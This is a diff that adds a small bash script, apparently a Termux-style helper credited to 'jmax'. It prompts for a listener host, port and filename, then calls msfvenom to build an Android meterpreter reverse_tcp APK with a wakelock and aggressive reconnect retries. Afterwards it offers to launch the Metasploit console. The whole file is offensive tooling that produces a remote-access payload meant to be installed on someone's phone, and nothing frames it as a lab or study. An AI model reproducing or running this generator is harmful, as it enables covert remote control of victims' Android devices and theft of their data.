@@ -1,0 +1,57 @@
+#!/bin/bash
+red='\e[1;31m'
+green='\e[1;32m'
+blue='\e[1;34m'
+purple='\e[1;35m'
+cyan='\e[1;36m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+
+clear
+echo ""
+echo ""
+echo -e $cyan
+figlet PAYLOAD
+echo ""
+echo ""
+echo -e $white" • codded by jmax , all rights reserved @ https://www.github.com/jmaxojan"
+echo ""
+echo ""
+echo -e $green"Enter the payload inforamation to create it"
+echo ""
+echo -e $yellow
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] LHOST  , eg: eip or 127.0.0.1 : \e[0m\en' lhost
+echo ""
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] LPORT  , eg: 4444 : \e[0m\en' lport
+echo ""
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] output , eg: payload (without .apk) : \e[0m\en' output
+echo ""
+echo -e $white"Creating the payload ..."
+echo ""
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport AndroidWakelock="true" StagerRetryCount="999999" StagerRetryWait="1" -o /sdcard/$output.apk
+echo ""
+echo -e $green"Payload has been created successfully"
+echo ""
+echo -e $yellow"
+Results:
+    |
+    |
+    |---> LHOST  : $lhost
+    |---> LPORT  : $lport
+    |---> OUTPUT : $output
+
+"
+echo -e $cyan
+read -p "Would you like to open MetaSploit Console? (y/n) > " msf
+if [ $msf == y ]
+then
+echo "Opening msf please wait ..."
+msf
+elif [ $msf == n ]
+then
+exit
+else
+echo ""
+echo -e $red"Wrong choice , if you want to open msf console write msf"
+exit
+fi
